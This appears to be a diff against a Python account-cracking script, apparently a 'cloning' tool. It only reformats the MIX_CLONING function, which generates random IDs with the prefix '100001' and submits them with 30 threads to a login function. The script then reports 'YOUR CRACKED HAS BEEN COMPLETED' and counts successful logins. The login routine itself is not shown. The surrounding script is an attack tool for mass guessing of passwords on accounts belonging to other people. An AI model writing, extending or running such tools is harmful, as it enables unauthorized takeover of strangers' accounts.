@@ -780,7 +780,8 @@ def MIX_CLONING():
     linex()
     year_code = '100001'
     for i in range(int(limit)):
-    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
+        data=str(random.choice(range(1000000000,1999999999)))
+        user.append(data)
     with tred(max_workers=30) as jihad:
         clear()
         print(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mTOTAL ID \33[38;5;46m▶ \033[1;97m{limit}')
@@ -788,9 +789,14 @@ def MIX_CLONING():
         linex()
         for mal in user:
             uid=year_code+mal
-	    jihad.submit(login3,uid)
-    line();print(f'\r\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;46m!');linex();print(f'\r\r\r\r\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mTOTAL OK \33[38;5;46m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;46m!\033[1;37m');main()
-
+            jihad.submit(login3,uid)
+    line()
+    print(f'\r\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;46m!')
+    linex()
+    print(f'\r\r\r\r\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mTOTAL OK \33[38;5;46m▶ \x1b[38;5;46m{len(oks)}')
+    linex()
+    input(f'\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;46m!\033[1;37m')
+    main()
 def RANDOM_CLONING():
     user=[]
     clear()
